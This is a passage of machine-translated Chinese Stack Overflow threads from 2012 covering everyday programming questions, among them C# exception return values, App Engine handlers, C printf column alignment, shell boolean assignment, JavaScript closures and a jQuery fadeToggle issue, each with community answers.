> 赞同：2
> 
> 时间：2012-11-25T06:17:26.307

听起来你的函数返回一个`int`值。

在你的`try`块中，你得到并返回一个整数值。没关系。

在该`catch`块中，您没有提到返回整数。这就是问题。

因此，当函数采用异常路径时，它没有整数可以传回，从而导致错误。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-25T06:18:00.473

你的整个函数需要返回值。由于您在 try-cathc 中吃异常，因此您需要在函数结束时返回某种类型。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-25T06:20:24.433

使用 finally 块返回 int：

```
 try
  {
    //insert command  (This is where the duplicate column error is thrown)
    //Select @@Identity & Return it       
  }
  catch (SqlCeException ex)
  {
   if (ex.NativeError == 25016)
        MessageBox.Show("Username already in use."); 
   else
     //whatever
  }
  finally
  {
    return -1;
  } 
```

如果 try 块返回 Identity 值，那么 finally`return -1`将不会生效。[参考](https://stackoverflow.com/questions/3715198/will-finally-blocks-be-executed-if-returning-from-try-or-catch-blocks-in-c-if)

# python - Google App Engine 的脚本处理程序

> ID：13548784
> 
> 赞同：1
> 
> 时间：2012-11-25T06:13:34.677
> 
> 标签：python, google-app-engine

我正在尝试在 Google App Engine 中使用 Python 学习，但无法使教程正常工作。但最终，我想编写一个 Python 脚本，将服务器文件夹中的文件列表返回给 JavaScript。

这是我目前拥有的：

```
+MainProj  
   + static  
      +scripts  
          . __init__.py  
          . helloworld.py  
   . app.yaml 
```

在 helloworld.py

```
import webapp2

class MainPage(webapp2.RequestHandler):
    def get(self):
        self.response.headers['Content-Type'] = 'text/plain'
        self.response.write('Hello, webapp2 World!')
app = webapp2.WSGIApplication([('/.*', MainPage)], debug=True) 
```

在 app.yaml

```
application: applicationname
version: 1
runtime: python27
api_version: 1
threadsafe: yes

handlers:
- url: /.*
  script: static.scripts.helloworld.app 
```

我收到服务器错误

```
HTTP Error 500 (Internal Server Error): An unexpected condition was encountered while the server was attempting to fulfill the request. 
```

任何人都可以帮助我的设置有什么问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T10:48:30.377

包路径（'static.scripts.helloworld.app'）中的每个文件夹都需要`__init__.py`在其中正确导入，因此要么将一个文件夹添加到'static'，要么（在我看来更明智）将 helloworld.py 移至顶部，并在您的 app.yaml 中使用“helloworld.app”。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-25T06:35:11.593

您的`app.yaml`处理程序中需要的只是：

```
 - url: /.*
   script: static.scripts.helloworld.py 
```

并确保您`helloworld.py`在底部代码中也有实际启动应用程序和侦听器：

```
from google.appengine.ext.webapp import util
# granted, you might want to replace "webapp" with "webapp2" here

def main():
    util.run_wsgi_app(app)

if __name__ == '__main__':
    main() 
```

# c - 在 C 中使用 printf 自定义字符串对齐

> ID：13548785
> 
> 赞同：1
> 
> 时间：2012-11-25T06:13:44.390
> 
> 标签：c, string, printf

我正在尝试从给定数组中获取以下输出

```
 Apples      200   Grapes      900 Bananas  Out of stock
 Grapefruits 2     Blueberries 100 Orangess Coming soon
 Pears       10000 
```

这是我到目前为止提出的（感觉好像我做得过火了），但是，在填充列时我仍然遗漏了一些东西。我愿意接受有关如何解决此问题的任何建议。

```
#include <stdio.h>
#include <string.h>

#define ARRAY_SIZE(a) (sizeof(a) / sizeof(a[0]))
char *fruits[][2] = {
    {"Apples", "200"},
    {"Grapes", "900"},
    {"Bananas", "Out of stock"},
    {"Grapefruits", "2"},
    {"Blueberries", "100"},
    {"Oranges", "Coming soon"},
    {"Pears", "10000"},
};

int get_max (int j, int y) {
    int n = ARRAY_SIZE(fruits), width = 0, i;
    for (i = 0; i < n; i++) {
        if (i % j == 0 && strlen(fruits[i][y]) > width) {
            width = strlen(fruits[i][y]);
        }
    }
    return width;
}

int main(void) {
    int n = ARRAY_SIZE(fruits), i, j;
    for (i = 0, j = 1; i < n; i++) {
        if (i > 0 && i % 3 == 0) {
            printf("\n"); j++;
        }
        printf("%-*s ", get_max(j, 0), fruits[i][0]);
        printf("%-*s ", get_max(j, 1), fruits[i][1]);
    }
    printf("\n"); 
    return 0;
} 
```

电流输出：

```
Apples      200          Grapes      900          Bananas     Out of stock 
Grapefruits 2            Blueberries 100          Oranges     Coming soon  
Pears       10000 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T06:26:10.983

您计算的宽度错误。本质上，您希望能够计算特定列的宽度。因此，在您的`get_max`函数中，您应该能够指定一列。然后我们可以根据它们的索引 mod 3 是否等于列从列表中挑选出元素。这可以这样完成：

```
int get_max (int column, int y) {
    ...
        if (i % 3 == column /* <- change */ && strlen(fruits[i][y]) > width) {
    ...
} 
```

然后在你的主循环中，你想根据你当前所在的列来选择列的宽度。你可以通过索引 mod 3 来做到这一点：

```
for (i = 0, j = 1; i < n; i++) {
    ...
    printf("%-*s ", get_max(i % 3 /* change */, 0), fruits[i][0]);
    printf("%-*s ", get_max(i % 3 /* change */, 1), fruits[i][1]);
} 
```

这应该可以按您的预期工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T06:25:23.037

我尝试理解您的逻辑，但我认为您可以使用带有“\t”的制表符来分隔数据：

```
printf("%s \t %d","banana", 200); 
```

# c - 这是否会通过 C 中的链接调用未定义的行为？

> ID：13548786
> 
> 赞同：2
> 
> 时间：2012-11-25T06:14:32.920
> 
> 标签：c, c99, undefined-behavior, linkage

来自 (6.2.2/7) C99 标准

> `7.`如果在翻译单元内，相同的标识符同时出现在内部和外部链接中，则行为未定义。

虽然以下由于定义冲突而产生编译时错误

```
// 'x' has external linkage
extern int x;

// Here, 'x' has internal linkage
static int x; 
```

但以下编译得很好，

```
// 'x' has external linkage
extern int x;

void foo() {
  // Here, 'x' has internal linkage
  static int x;
} 
```

这两种情况都会调用未定义的行为吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T06:33:19.443

您的问题源于一个错误的假设，即本地声明的静态变量具有*内部*链接。实际上，在块作用域中声明的静态变量*没有链接*。见 6.2.2/6

> **6**以下标识符没有链接： 声明为对象或函数以外的任何东西的标识符；声明为函数参数的标识符；没有存储类说明符**extern**声明的对象的块范围标识符。

只有文件范围声明可以有外部或内部链接（加上本地`extern`声明）。

因此 6.2.2/7 和您的问题根本不适用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T06:26:23.570

据我所知，它没有，因为这两个变量不一样。局部变量优先于全局变量，在 的范围内`foo()`，它只声明一次。查看汇编器输出 - 编译器很可能会将这两个变量转换为两个不同的符号。

# uitabbarcontroller - "- (void)splitViewController willHideViewController with BarButtonItem forPopoverController" 未调用

> ID：13548791
> 
> 赞同：1
> 
> 时间：2012-11-25T06:15:31.597
> 
> 标签：uitabbarcontroller, storyboard, uisplitviewcontroller

我有一个具有以下架构的应用程序：

> 登录 -> 标签栏 ->
> 
> 1.  UINavigationController -> Tab1ViewController
> 2.  UISplitViewController -> UINavigationController -> MasterViewController/DetailViewController
> 3.  UINavigationController -> Tab3ViewController

然后我在我的 DetailViewController 中实现

```
- (void)splitViewController:(UISplitViewController *)splitController willHideViewController:(UIViewController *)viewController withBarButtonItem:(UIBarButtonItem *)barButtonItem forPopoverController:(UIPopoverController *)popoverController 
```

但它永远不会被调用。

我还将 splitview 委托放在我的详细信息中：

```
@interface DetailViewController : UITableViewController
<UISplitViewControllerDelegate> 
```

有什么我想念的吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T06:20:04.930

你错过了很多东西。

一、为了快速解决你的问题，写：

```
splitViewController.delegate = self; 
```

第二，请注意，您是否遵守`<UISplitViewControllerDelegate>`协议并不重要。这只是对编译器的一个提示——它不会让视图控制器神奇地知道哪个对象应该是它的委托......

三，作为旁注：这与 Xcode 完全无关。

# php - 如何在 WordPress 中动态启用/禁用插件？

> ID：13548792
> 
> 赞同：4
> 
> 时间：2012-11-25T06:16:01.087
> 
> 标签：php, wordpress

如何在 WordPress 中动态启用/禁用插件（不使用管理员）？

示例：我有一个检测移动设备的脚本，我想相应地禁用某些插件。这可以做到吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T06:24:06.867

使用 deactivate_plugin 和 activate_plugin 函数。

*[查看通过主题禁用插件/插件操作](https://wordpress.stackexchange.com/questions/12163/disable-plugin-plugin-action-via-theme)*的帖子（在 Stack Exchange 站点*[WordPress Development](https://wordpress.stackexchange.com/tour)*上）。

# android - 为什么一个按钮可以添加多个 ClickListener

> ID：13548801
> 
> 赞同：2
> 
> 时间：2012-11-25T06:18:13.957
> 
> 标签：android

我通常编码

```
 Button button1 = (Button)findViewById(R.id.start1);
    button1.setOnClickListener(mStart1Listener);
    Button button2 = (Button)findViewById(R.id.start2);
    button2.setOnClickListener(mStart2Listener); 
```

但在 android 示例中，我在 ServiceStartArgumentsController.java 中找到了这些

```
 protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    setContentView(R.layout.service_start_arguments_controller);

    // Watch for button clicks.
    Button button = (Button)findViewById(R.id.start1);
    button.setOnClickListener(mStart1Listener);
    button = (Button)findViewById(R.id.start2);
    button.setOnClickListener(mStart2Listener);
    button = (Button)findViewById(R.id.start3);
    button.setOnClickListener(mStart3Listener);
    button = (Button)findViewById(R.id.startfail);
    button.setOnClickListener(mStartFailListener);
    button = (Button)findViewById(R.id.kill);
    button.setOnClickListener(mKillListener);
} 
```

它们有什么区别，为什么一个按钮可以添加多个ClickListener

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T06:19:31.357

> 它们有什么区别，为什么一个按钮可以添加多个ClickListener

一个 View 只能有一个 OnClickListener。第二种方法只是重新使用变量`button`，注意第三行：

```
Button button = (Button)findViewById(R.id.start1);
button.setOnClickListener(mStart1Listener);
button = (Button)findViewById(R.id.start2); // This one 
```

`button`它用*新*的 Button覆盖之前的值，并且*新*的Button 将被分配下一个 OnClickListener。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T06:21:33.823

那不是一个按钮。它在每个 setOnClickListener 之前发生变化；该代码只为该活动上的不同按钮使用一个变量。

# c - C 中固定长度 > 64 的类型

> ID：13548802
> 
> 赞同：2
> 
> 时间：2012-11-25T06:18:35.960
> 
> 标签：c, types

我目前正在用 C 编写一些加密代码，这些代码必须处理大于 uint64_t 能够容纳的数字。（用于HDCP认证，其中一个密码值为84位）

最好的方法是什么？我需要存储的变量之一是 84 位长——我是否应该将 uint64_t 用于低 64 位，将 uint32_t 用于高 20 位？这对我来说似乎是一个 hack，但我不确定是否真的有更好的解决方案，特别是对于存储在结构中。

理想的替代方法是声明一个自定义数据类型，如 uint64_t，但改为 84 位长，其行为方式相同。这甚至可能吗？我不确定 libc 是否可以处理位宽不是 8 倍数的变量，但是 88 位类型可以解决这个问题，尽管我什至不确定声明自定义位宽数据类型的可行性。

**编辑：**我已经检查了 uint128_t，但这在 clang 的 C99 模式中似乎不存在。我将对此进行标准算术和位运算，这是与加密代码相关的标准shebang。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T06:46:15.327

好的，我刚刚安装了一个 32 位的 Clang 3.1，它可以工作：

```
#include <stdio.h>

int main()
{
    unsigned __int128 i;
    printf("%d\n", sizeof(i));
} 
```

（并打印“16”。）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-25T09:15:51.077

7 年前，我的密码学教授向我们介绍了[MIRACL](http://certivox.com/solutions/miracl-crypto-sdk/)开源库，其中包含非常快速的密码函数实现和处理大精度数字的工具。我已经很久没有使用它了，但它似乎仍然处于良好状态。如果您的问题只是准确地表示 84 位值而不是其他任何东西，这可能并不理想，但它可能是一个更通用的解决方案。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-25T06:56:05.057

如果你需要超过 64 位，并且目标环境中没有超过 64 位的整数类型，那么你必须使用其他东西。您将不得不使用两个变量、一个数组，或者可能是一个具有多个成员的结构。如果要添加数字，您还必须自己创建操作，例如加号函数。

C 中没有内置支持来轻松​​自动地创建 N 位整数。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-25T07:23:40.423

[GNU 多精度 (GMP)](http://gmplib.org)库怎么样？它声称任意精度：

> GMP 是用于任意精度算术的免费库，可对有符号整数、有理数和浮点数进行操作。除了运行 GMP 的机器中的可用内存所暗示的精度外，对精度没有实际限制。GMP具有丰富的功能集，并且功能具有规则的接口。

# java - 为什么 ThreadPoolExecutor 在 Eclipse 和命令行中运行 Java 程序时表现不同？

> ID：13548809
> 
> 赞同：2
> 
> 时间：2012-11-25T06:20:27.663
> 
> 标签：java, eclipse, out-of-memory, threadpoolexecutor

任何人都可以解释为什么当我从 Eclipse (Juno) 运行这段代码时会抛出 OOME，但是当我从命令行运行它时可以正常工作？我在这两种情况下都使用 -Xmx256M。

```
static class Task implements Runnable {
    byte[] buf = new byte[150000000];
    @Override
    public void run() {
    }
}

public static void main(String[] args) throws Exception {
    System.out.println(Runtime.getRuntime().maxMemory());
    ExecutorService ex = Executors.newSingleThreadExecutor();
    ex.submit(new Task()).get();
    ex.submit(new Task()).get();
} 
```

这是 Eclipse 输出

```
259522560
Exception in thread "main" java.lang.OutOfMemoryError: Java heap space
    at Test2$Task.<init>(Test2.java:7)
    at Test2.main(Test2.java:17) 
```

我在笔记本上运行它，不确定它在其他 PC 上的表现如何。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T06:27:33.837

-- 原始响应 -- Eclipse 以 256M 运行，但是您是否编辑了应用程序的运行配置以使启动的应用程序也具有 256aM？如果没有，它将使用默认堆运行。

-- 问题更新后更新 --

我测试了下面的代码，它在 Eclipse 和外部运行良好。

OOME 是否在第一次运行时发生（例如，以下输出是什么？），改变分配位置是否会影响事情？：

```
public class Test {
    public static class Task implements Runnable {
        byte[] buf;
        int id;
        public Task(int i) {
            id = i;
        }

        @Override
        public void run() {
            buf = new byte[150000000];
            System.out.println("hi " + id);
        }
    }

    public static void main(String[] args) throws Exception {
        System.out.println(Runtime.getRuntime().maxMemory());
        ExecutorService ex = Executors.newSingleThreadExecutor();
        ex.submit(new Task(1)).get();
        ex.submit(new Task(2)).get();
    }
} 
```

# python - 根据字符串分配点

> ID：13548810
> 
> 赞同：0
> 
> 时间：2012-11-25T06:21:05.640
> 
> 标签：python

我正在尝试使用正则表达式和字符串创建某种类型的评分系统。如果我有一个评分表：

```
string = "foo is my favorite bar ever!"
score = 0
scorelist = {
'\bfoo\b': score += 10,
'hello (foo (bar)?|there)': score -= 15
} 
```

现在，我知道这是完全不正确的（考虑到未评估字符串，甚至未完成）尝试生成新分数，但没有任何关于做什么的指导。希望这对于我如何让它工作的糟糕代码有点不言自明。

编辑：如果匹配为真，记分表应该保存匹配和结果。因此，在这种情况下，如果在字符串中（好吧，应该是）找到单词 foo，则 score 将 +10。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T11:30:09.367

装饰器在这里工作得很好：

```
class Matcher(object):
    def __init__(self):
        self.score = 0
        self.patterns = []

    def case(self, pattern):
        def decorator(f):
            self.patterns += [(re.compile(pattern), f)]
            return f
        return decorator

    def match(self, s):
        for pattern, action in self.patterns:
            if pattern.search(s):
                action(self)

m = Matcher()

@m.case(r'\bfoo\b')
def fooMatched(self):
    self.score += 10

@m.case(r'hello (foo (bar)?|there)')
def helloMatched(self):
    self.score -= 15

m.match("foo is my favorite bar ever!")

print m.score 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T06:49:44.737

我喜欢这种方法：

```
#!/usr/bin/env python

import re

scorelist = [
    ('\bfoo\b', 10),
    (re.compile('hello (foo (bar)?|there)'), -15),
    ]

score = 0
mystring = "foo is my favorite bar ever!"
for pattern, pscore in scorelist:
    if isinstance(pattern, basestring):
        if pattern in mystring:
            score += pscore
    else:
        if pattern.search(mystring):
            score += pscore 
```

因此，对于 中的每个`(pattern, pscore)`元组`scorelist`，如果模式是字符串，请在 中查找该字符串`mystring`。如果存在，则`score`增加`pscore`.

如果`pattern`is not 不是字符串，则将其视为正则表达式并针对`mystring`. 如果匹配，则`score`增加`pscore`.

只需少量的前期工作，就可以使系统在未来易于扩展。

# shell - Shell 脚本中的布尔值

> ID：13548814
> 
> 赞同：7
> 
> 时间：2012-11-25T06:22:24.497
> 
> 标签：shell

我有一个布尔 for while 循环的问题。因此，我改用 for 循环。但是，在满足条件后，我仍然无法更改布尔值。

```
doFirst= true
    for (( j=1; j<=7; j++))
    do
            letter="A"
            seatChoses=$letter$j

            flagRand=$(echo $flightSeatBooked | awk -v flseatRand=$flightSeatBooked -v orseatRand=$seatChoses '{print match(flseatRand, orseatRand)}')
            if  $doFirst ; then
            **$doFirst= false** // Here is the error!
                if [ $flagRand -eq 0 ]; then
                    echo "System generated a slot, "$seatChoses" for you. [Y or N]"
                fi
            fi

    done 
```

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-11-25T06:47:04.667

在 shell 脚本中没有布尔值之类的东西（也就是说，您可以将其存储在变量中，并将其视为布尔值）。`true`并且`false`是命令；`true`以值 0`false`退出，并以非零值退出。`if`bash 中的语句接受命令；如果该命令返回 0，则`then`执行该子句，否则执行该`else`子句。

```
doFirst= true 
```

这条线根本不符合您的期望。在 shell 脚本中，等号后不能有任何空格。空格表示您已完成分配，现在正在编写命令。这相当于：

```
doFirst="" true 
```

此外，如果您在命令之前有一个赋值（像这样），那实际上并没有在 shell 中执行赋值。仅在该命令的环境中设置该环境变量；该分配对该命令之外的任何内容都没有影响。

```
if  $doFirst ; then 
```

这会扩展`$doFirst`变量，并尝试将结果解释为命令。奇怪的是，如果`$doFirst`是未定义的（正如我在上面解释的那样），这需要`then`分支。到那时，你又犯了第一个错误，试图将一个变量设置为假，但又一次，什么也没发生；`$doFirst`未定义。你犯了进一步的错误，试图分配`$doFirst`；您用于`$`获取变量的值，设置时使用裸名。

我的建议是不要尝试在 Bash 中使用布尔值；只需使用字符串，并检查字符串的值。请注意，我删除了空格，所以现在我将其设置为确切的字符串；并且没有命令，所以这会在 shell 中设置变量，而不是在单个命令的环境中：

```
doFirst=true
# ...
   if [ $doFirst = true ]; then
       doFirst=false
   # ... 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-25T06:27:02.480

您实际上是`=`在“真”/“假”之间放置一个空格还是格式错误？这是你的问题之一。

另一个，正如 Anders Lindahl 在评论部分提到的，当你在 shell 脚本中设置一个变量时，你不能`$`在前面使用。你必须说

```
doFirst=false 
```

同样，请注意等号周围*没有空格。*

# javascript - 无法访问班级成员

> ID：13548816
> 
> 赞同：0
> 
> 时间：2012-11-25T06:22:33.883
> 
> 标签：javascript, scope

```
function Example(){
     var id;
};

Example.prototype.getId = function(){
     // return this.id; 
};

Example.prototype.init = function(){
   $.post( 'generateId.php', {}, function(data){
       // this.id = data; 
   });   
}; 
```

如何在这些函数中访问 id？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T06:25:25.550

您似乎认为 Javascript 中存在“私有”变量。私有变量仅通过闭包在 Javascript 中模拟，但不像其他语言那样存在。在您的代码中，`id`只能从您的构造函数中访问。

你可以保持`id`私有，并且仍然可以从你的函数中访问它，但是你必须在你的构造函数中将这些函数声明为闭包才能访问它：

```
function Example()
{
    //private
    var id;

    this.getId = function ()
    {
        return id;
    }

    this.init = function()
    {
       $.post( 'generateId.php', {}, function(data)
       {
           id = data;
       });   
    };
}; 
```

另一个问题是您试图`this`从异步回调中访问。在此上下文中（传递给 的回调`$.post`），`this`无论调用函数的上下文是什么，它可能是未定义的或 XmlHTTPRequest 对象。

如果你想访问它，你必须缓存`this`你的函数（从你的原始代码，假设`id`不是私有的）：

```
Example.prototype.init = function()
{
   var self = this;
   $.post( 'generateId.php', {}, function(data)
   {
       self.id = data;
   });   
}; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T06:26:09.577

也许你可以重写一下：

```
var Example = Example || {};
Example.id = "";

Example.init = function(){
$.post( 'generateId.php', {}, function(data)
{
   Example.id = data; // <-------- error
});  
} 
```

# java - 我的快速排序超出范围

> ID：13548822
> 
> 赞同：0
> 
> 时间：2012-11-25T06:24:38.393
> 
> 标签：java, arraylist, quicksort, indexoutofboundsexception

我正在创建快速排序来对离特定城市最近的其他城市进行排序。

这是我的代码：

```
 private static void QuickSort(ArrayList<City> array, int First, int Last, City city ){
    int Low,High,MidDistance;
    Low = First;
    High = Last;
    Edge compareEdge = new Edge(array.get((First + Last)/ 2), city);
    MidDistance = compareEdge.computeDistance();

    do {
        compareEdge = new Edge(array.get(Low),city);
        while (compareEdge.computeDistance() < MidDistance){
            Low += 1;
            compareEdge = new Edge(array.get(Low),city);
        }

        compareEdge = new Edge(array.get(High),city);
        while (compareEdge.computeDistance() > MidDistance){
            High -= 1;
            compareEdge = new Edge(array.get(High),city);
        }

        if (Low <= High) {
                Swap(array,Low,High);
                Low = Low + 1;
                High = High - 1;
        }

    } while (Low <= High);

    if (First < High){
        QuickSort(array, First, High, city);
    }

    if (Low < Last){
        QuickSort(array, Low, Last, city);
    }

}

private static void Swap(ArrayList<City>array,int Low, int High){
    City tempCtiy = array.get(Low);
    array.get(Low).set(array.get(High));
    array.get(High).set(tempCtiy);
} 
```

此代码在我的 MST 类中。所以当我运行它时

> 线程“主”java.lang.IndexOutOfBoundsException 中的异常：索引：49，大小：49

它发生在这里：

```
 while (compareEdge.computeDistance() < MidDistance){
        Low += 1;
        compareEdge = new Edge(array.get(Low),city);
    } 
```

帮我找出问题所在。当我在 VB.net 中编写时，它运行良好。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T06:36:37.077

`while`在on中添加终止条件，`Low`如下所示：

```
 while (compareEdge.computeDistance() < MidDistance &&
              && Low < array.size()-1){
              Low += 1;
              compareEdge = new Edge(array.get(Low),city);
      } 
```

# php - php - 条件的好处 - 切换 if-then

> ID：13548828
> 
> 赞同：0
> 
> 时间：2012-11-25T06:25:36.653
> 
> 标签：php, if-statement, switch-statement

> **可能重复：**
> [Switch vs if 语句](https://stackoverflow.com/questions/4241768/switch-vs-if-statements)

在一个非常简单的 php 场景中，有什么好处（如果有的话）：

```
function foo_1($bar){
  if $bar == 'yes'{
  return 'yes';
  } 
// or the use of 'else'
 if $bar == 'no'{
 return 'no';
  }
} 
```

反对 ：

```
function foo_2($bar){
 switch ($bar) {
    case 'yes' :
     return 'yes';
    break;

    case 'no' :
     return 'no';
    break; 
    }
  }
} 
```

（旁注：我知道如果我们有多个条件（ if ($bar=='yes') && ($bar !='else')..）这可能是一个原因，但在那种情况下，一个人可以有里面有条件的情况..）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T07:14:25.043

这是一个偏好问题，因为**if**和**switch**都可以提供相同的功能。我会问自己哪个选项使您的代码更具可读性。

# php - 比较所有 php 框架以检查哪个更高效

> ID：13548829
> 
> 赞同：0
> 
> 时间：2012-11-25T06:26:00.607
> 
> 标签：php, mysql

我们正在建立社交网络网站。

为此，我比较了 php.ini 中所有可用的框架。我和 YII 和 Zend 一起出来。

现在我被困在更好的框架中，它使用更少的资源并提供最佳输出。考虑到我已经在进行代码优化和数据库优化。

任何帮助将被拨款？

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T13:15:03.087

扩展 PHP 的定义方法是：添加硬件。它不会尝试以任何其他方式进行扩展。

这是成功的，因为硬件很便宜，而且添加起来很容易。这确实意味着在您开始使用 PHP 编写项目之前，您必须有预算来支付项目部署后将消耗的硬件。

Facebook 的收入来源永无止境，微软等公司的巨额投资，总规模达到数十亿美元；这使他们能够在可以支持他们的应用程序的基础设施上进行大量投资 - 但它仍然失败了。

Facebook 搞错了，有句名言“*钱多于脑*”；他们在 8 核或 16 核的服务器上部署 PHP，而 PHP 一次只能使用一个，一次只能做一件事。这是基本的数学，如果它使用它拥有的所有东西，他们的应用程序会更好地扩展。

[http://docs.php.net/Thread](http://docs.php.net/Thread)

真正的，正确的答案，来自*有头脑*的人。

你可能会想，是的，但是 hiphop 编译的是真正的代码，它肯定支持线程；但事实并非如此，他们甚至从未尝试过：

[https://github.com/facebook/hiphop-php/blob/master/doc/threading](https://github.com/facebook/hiphop-php/blob/master/doc/threading)

我是 pthreads 的作者，我并不是说它已经准备好让你开发你的应用程序，但我建议 pthreads 提供了一种可行的方法来扩展应用程序，而不是“添加硬件”，你应该吃掉你盘子里的所有东西求秒，这叫“礼节”。我确实需要人们加入并开始使用 pthreads 开发他们的想法，但它还不能被认为是稳定的。如果您在 PHP 中思考，那么很快就可以对您的想法进行原型设计，自己找出 pthreads 是否合适，如果不合适，请提交错误报告或通过任何其他方式联系。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T06:33:40.780

像其他大型网络应用程序一样，Facebook 在很大程度上是由硬件扩展的，而且框架对它的影响不如软件工程实践那么大！如果你正在开发一个新产品，你应该专注于产品本身，而不是在这个阶段被它的性能所消耗。

当这一天到来时，性能问题将是您可能遇到的最好问题。即您将拥有庞大的用户群）

祝你好运！

# jquery - fadeToggle() 效果的图像问题

> ID：13548833
> 
> 赞同：0
> 
> 时间：2012-11-25T06:26:41.170
> 
> 标签：jquery, image, toggle, fade

我是 JQuery + CSS 的新手，所以请耐心等待。我正在制作一个只有带有徽标的标题的网站，我需要它就像一个按钮一样。单击它时，它必须更改上部 div 的背景（图像）。但是，当我点击它时，背景会发生变化，但标志会消失..

我的问题应该很简单，但我在任何地方都看不到解决方案......我正在使用这个：

```
 <!DOCTYPE html>
<html lang="en">
    <head>
        <title></title>
        <meta charset="utf-8">
        <link rel="stylesheet" href="css/reset.css" type="text/css" media="all">
        <link rel="stylesheet" href="css/layout.css" type="text/css" media="all">
        <link rel="stylesheet" href="css/style.css" type="text/css" media="all">
        <script src="http://code.jquery.com/jquery-latest.js"></script>
        <script type="text/javascript" src="js/atooltip.jquery.js"></script>
        <script type="text/javascript" src="js/kwicks-1.5.1.pack.js"></script>
        <script type="text/javascript" src="js/script.js"></script>

</head>
<body id="page1">
<div class="body2" >
    <div id = "fundo" class="bodyoff">
        <div class="main">
<!-- header -->
            <header>
                <div id="a">
                    <h1><a id="logo" class="normaltip" title="Under Construction!"></a>
                </div>
            </header>
            <div class="ic">myweb.com.br</div>
<!-- / header -->
<!-- content -->
            <div class="inner">
                <div class="kwiks_wrap">
                </div>
            </div>
<!-- / content -->
<!-- footer -->
            <footer>
                <div class="wrapper">
                    <ul id="icons">
                        <li><a href="#" class="normaltip" title="Facebook"><img src="images/icon1.png" alt=""></a></li>
                        <li><a href="#" class="normaltip" title="Twitter"><img src="images/icon4.png" alt=""></a></li>
                    </ul>
                </div>
                Support <a rel="nofollow" href="http://www.example.ufmg.br/" target="_blank">Inovation</a> - Example <br>
            </footer>
<!-- / footer -->
        </div>
    </div>
</div>
<script>
    $("#logo").click(
        function(){
            $("#fundo").fadeToggle("body2");
        }
    );
</script>
</body>
</html> 
```

“body2”和“bodyoff”之间的区别只是“背景”图像。为什么不能正常工作？？

声明了一些样式：

```
.bodyoff {
    background: url(../images/bg_img_turnoff.jpg) top center no-repeat;
    height: 100%;
    min-height: 745px; } 
.body2 {
    background: url(../images/bg_img.jpg) top center no-repeat;
    height: 100%;
    min-height: 745px; } 
h1 {
    float: left;
    padding: 114px 0 0 63px; }
#logo {
    display: block;
    background: url(../images/logo.png) repeat;
    width: 319px;
    height: 86px;
    text-indent: -9999px; } 
```

我做错了什么？标志不应该消失……应该吗？：/

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T06:38:26.837

~~尝试给你的#logo div 一个更高的 z-index，z-index: 9999;~~

如果这不起作用，请使用 img 标签来保存徽标，而不是使用 div.background。

~~我认为标志的 img 标签是一种更好的方法。~~

我认为问题在于您调用了 fadeToggle() 方法。当 fadeToggle() 动画完成时，它有效地从视图中隐藏元素，包括它的子元素（有你的标志）。

我认为您需要的是 .toggleClass('body2') 来更改目标元素的 css 类。

[在http://jsfiddle.net/BuddhiP/VY3tp/2/](http://jsfiddle.net/BuddhiP/VY3tp/2/)检查更改的小提琴

jQuery 文档：[toggleClass](http://api.jquery.com/toggleClass/)与[fadeToggle](http://api.jquery.com/fadetoggle/)

希望这可以帮助。很抱歉没有注意到之前的 fadeToggle()。

我还将您的带有背景图片的标签更改为带有 src 属性的直接标签，因为我相信当它不是真正的背景图片时，您不应该使用背景图片，特别是如果您希望它可点击。如果您在页面上获得更多恰好覆盖您的徽标的元素，这可能会给您带来很多麻烦。

```
<img id="logoimg" tittle="my logo" src="http://img211.imageshack.us/img211/1775/logoex.png"></img> 
```

但是这个改变对于这个例子来说并不是必须的，它甚至可以和你原来的行一起工作

```
<a id="logo" tittle="my logo"></a> 
```

# php - 如何使用庞大的 MySQL 数据库加速 PHP 脚本

> ID：13548837
> 
> 赞同：1
> 
> 时间：2012-11-25T06:27:14.833
> 
> 标签：php, mysql, xml, performance, rss

我一直在努力设置 RSS 提要，并在这里的一些人的帮助下完成了它。但是，我真的需要一些更有经验的编码人员的建议，向我展示需要更改哪些内容才能保持相同的功能但加快页面加载速度。

它查看 30 个 RSS 项目并从我的 MySQL 数据库中获取 URL。问题是它从该表的 1 亿多行中随机选择 30 行。这就是它应该做的，但是由于表格中有这么多行，这真的减慢了脚本的速度，我需要帮助！

```
<?php header("Content-type: text/xml"); ?>
<?php echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"; ?>
<?php include('directory/database.php'); ?>
<rss version="2.0">
<channel>
  <title>Website Reviews</title>
  <link>http://www.mywebsite.com</link>
  <description>Professional Services</description>
  <pubDate><?echo date('Y/m/d H:i:s');?></pubDate>

<?php
    foreach( range( 1, 30 ) as $i ):
$number = mt_rand( 1, 141754641 );
$query="SELECT * FROM `list` LIMIT $number , 1";
$result = mysql_query($query);
